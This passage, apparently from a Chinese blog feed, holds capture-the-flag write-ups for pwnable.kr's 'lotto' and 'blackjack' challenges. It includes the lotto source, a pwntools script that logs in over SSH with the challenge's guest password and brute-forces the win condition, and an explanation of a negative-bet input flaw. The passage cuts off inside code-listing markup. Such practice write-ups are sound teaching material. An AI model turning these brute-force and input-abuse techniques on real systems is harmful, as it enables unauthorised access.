    <content type="html"><![CDATA[<p>又回到了熟悉得ssh连接的题目，看题目描述是一个大乐透游戏：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210917174444.png"></p><p>连上去查看文件，玩一下，顺便把lotto.c源码下载到本地：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210917175003.png"></p><p>游戏玩法大致如下，每次输入六个ascii值小于46的字符，去匹配，都匹配到即可中一等奖拿到flag：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210917181104.png"></p><p>lotto.c源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> submit[<span class="number">6</span>];</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">play</span><span class="params">()</span></span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Submit your 6 lotto bytes : &quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">int</span> r;</span><br><span class="line">    r = read(<span class="number">0</span>, submit, <span class="number">6</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Lotto Start!\n&quot;</span>);</span><br><span class="line">    <span class="comment">//sleep(1);</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">// generate lotto numbers</span></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(fd==<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;error. tell admin\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> lotto[<span class="number">6</span>];</span><br><span class="line">    <span class="keyword">if</span>(read(fd, lotto, <span class="number">6</span>) != <span class="number">6</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;error2. tell admin\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</span><br><span class="line">        lotto[i] = (lotto[i] % <span class="number">45</span>) + <span class="number">1</span>;        <span class="comment">// 1 ~ 45</span></span><br><span class="line">    &#125;</span><br><span class="line">    close(fd);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// calculate lotto score</span></span><br><span class="line">    <span class="keyword">int</span> match = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>; j&lt;<span class="number">6</span>; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(lotto[i] == submit[j])&#123;</span><br><span class="line">                match++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// win!</span></span><br><span class="line">    <span class="keyword">if</span>(match == <span class="number">6</span>)&#123;</span><br><span class="line">        system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;bad luck...\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">help</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;- nLotto Rule -\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;nlotto is consisted with 6 random natural numbers less than 46\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;your goal is to match lotto numbers as many as you can\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;if you win lottery for *1st place*, you will get reward\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;for more details, follow the link below\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mathematical chance to win this game is known to be 1/8145060.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// menu</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> menu;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;- Select Menu -\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;1. Play Lotto\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;2. Help\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;3. Exit\n&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;menu);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">switch</span>(menu)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                play();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                help();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;bye\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;invalid menu\n&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    最开始看到随机数以及文件描述符，以为重点在这块，结果通读了一波程序，发现问题很简单，主要是下面对于值判断有利用的地方，这里两个for只要随机字符有一个和我们输入的字符都匹配那就可以完成条件，所以输入6个相同字符来暴力碰撞就可，反正提示可以尝试很多次。</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210918105805.png"></p><p>​    这里用pwntools来写个自动化脚本，然后自动碰撞即可拿到flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">shell=ssh(host=<span class="string">&quot;pwnable.kr&quot;</span>,user=<span class="string">&quot;lotto&quot;</span>,port=<span class="number">2222</span>,password=<span class="string">&quot;guest&quot;</span>)</span><br><span class="line">p=shell.process(<span class="string">&quot;./lotto&quot;</span>,)</span><br><span class="line">lottoBytes=<span class="built_in">chr</span>(<span class="number">5</span>)+<span class="built_in">chr</span>(<span class="number">5</span>)+<span class="built_in">chr</span>(<span class="number">5</span>)+<span class="built_in">chr</span>(<span class="number">5</span>)+<span class="built_in">chr</span>(<span class="number">5</span>)+<span class="built_in">chr</span>(<span class="number">5</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">data=p.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="built_in">print</span> data</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;bad luck&quot;</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;Select Menu&quot;</span> <span class="keyword">in</span> data):</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">data=p.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="built_in">print</span> data</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;Submit your 6 lotto bytes&quot;</span> <span class="keyword">in</span> data):</span><br><span class="line">p.sendline(lottoBytes)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210918105927.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;又回到了熟悉得ssh连接的题目，看题目描述是一个大乐透游戏：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210917174444.png&quot;&gt;&lt;/p&gt;
&lt;p</summary>
      
    
    
    
    <category term="pwn" scheme="http://example.com/categories/pwn/"/>
    
    
    <category term="pwnable.kr" scheme="http://example.com/tags/pwnable-kr/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.kr系列刷题之12-blackjack</title>
    <link href="http://example.com/2021/09/17/pwnable/pwnable.kr%E7%B3%BB%E5%88%9712-blackjack/"/>
    <id>http://example.com/2021/09/17/pwnable/pwnable.kr%E7%B3%BB%E5%88%9712-blackjack/</id>
    <published>2021-09-16T16:00:00.000Z</published>
    <updated>2021-09-17T09:31:08.284Z</updated>
    
    <content type="html"><![CDATA[<p>题目是一个游戏blackjack(我们叫做21点)，获取flag条件就是赢成百万富翁</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210917165031.png"></p><p>连上去看，就是玩游戏，还有游戏说明之类的，游戏起始资金$500，不知道是不是伪随机，反正靠运气赢到100w就是在做梦了。</p><p>游戏提示界面：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210917165429.png"></p><p>游戏开始界面：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210917165519.png"></p><p><strong>分析：</strong></p><p>​    这游戏就是找漏洞，源码已经给了，在<a href="http://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html">源码链接</a>处，不过好像挂了，搜索了一番，找到别人贴的源码，我在文章末尾也放了一份备份。</p><p>先玩几把游戏，熟悉一下流程，发现没啥思路，那还是直接去读代码吧，漏洞点肯定是和赢钱和输钱的处理有关，因为我们这里也就bet这一个输入点。游戏是一个简单的命令行程序，逻辑倒不复杂，直接去paly()中分析，cash是总钱数，bet是每次赌的钱数，这里程序处理逻辑有个明显的漏洞也就是对于bet他没有限制正负只限制了正数的大小，然后输赢都是简单的把bet加减到cash中：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210917171040.png"></p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210917170912.png"></p><p>要知道用户是不稳定的，你并不知道其会做出什么操作或者输入什么东西，所以对于用户的输入需要考虑到所有的情况然后过滤。那这里的漏洞利用方式也就很明显了，直接押注-1000000就可以了：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210917171456.png"></p><p>源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span 